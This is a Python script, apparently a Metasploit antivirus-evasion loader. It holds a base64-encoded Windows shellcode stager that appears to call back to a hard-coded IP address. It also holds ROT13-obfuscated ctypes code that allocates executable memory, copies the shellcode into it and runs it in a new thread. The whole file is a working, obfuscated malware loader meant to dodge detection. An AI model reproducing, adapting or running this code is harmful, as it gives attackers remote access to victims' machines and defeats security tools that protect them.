# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 9:00 下午
# @Author  : codervibe
# @File    : msf免杀加密混淆.py
# @Project : pythonBasics

import ctypes
import base64
a = '/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuIkTAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L29HUFcAgFg7cwYv7PisEs0eNRcaev3oFJVvQO8NhMs7nri7Qun0LsyM/ff4V8s+vctGuoowiTbF6ppACZ2fBWsSZuXJhOjsODxfgj+0EABVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNS4xOyBUcmlkZW50LzQuMDsgU1YxKQ0KAJhCBjKnIWJgnyMzTY72LfKIBhYM0vEov4BGiVSrVbxWBQkLVqTZQM7dPnfOTJhoBXSiccpwZ19h6IrkfX/NhaQpfdmQnsQG8ZE176/vuJdVrPhQRsHVdYnGEdGOecLN2tkjLWQ5lqXYPomlM5Z2WXYuq4QQjde8qkIu9Aqa+RXMDU/Pro516UpVdRGijX8JcTB5w7wyaFnP5opeH/hU9ymgUiXaZCbzsp5a5rExUU44Vrly1BBWWktFGBEflAviHQEnxWJUoQpoEIaCX0HKD8LfHaYe8lpa5JOM4qcAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjE2Mi4xMjEuMTQ3ABI0Vng='
shellcode = base64.b64decode(a)
def c(d):
    e = ''
    for f in d:
        if (ord(f) >= ord('A') and ord(f) <= ord('M')) or (ord(f) >= ord('a') and ord(f) <= ord('m')):
            e += chr(ord(f) + 13)
        elif (ord(f) >= ord('N') and ord(f) <= ord('Z')) or (ord(f) >= ord('n') and ord(f) <= ord('z')):
            e += chr(ord(f) - 13)
        else:
            e += f
    return e

g = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
exec(c(g))
